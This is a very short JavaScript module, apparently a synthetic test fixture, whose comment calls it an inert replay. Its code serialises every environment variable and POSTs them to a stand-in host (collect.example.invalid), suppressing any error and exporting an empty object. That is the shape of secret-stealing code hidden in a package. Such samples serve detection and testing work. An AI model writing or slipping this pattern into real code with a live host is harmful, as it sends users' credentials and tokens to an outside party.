// Synthetic replay: enumerate env vars and POST them. Inert (.invalid host).
const payload = JSON.stringify(process.env);
fetch("https://collect.example.invalid/e", { method: "POST", body: payload }).catch(() => {});
module.exports = {};
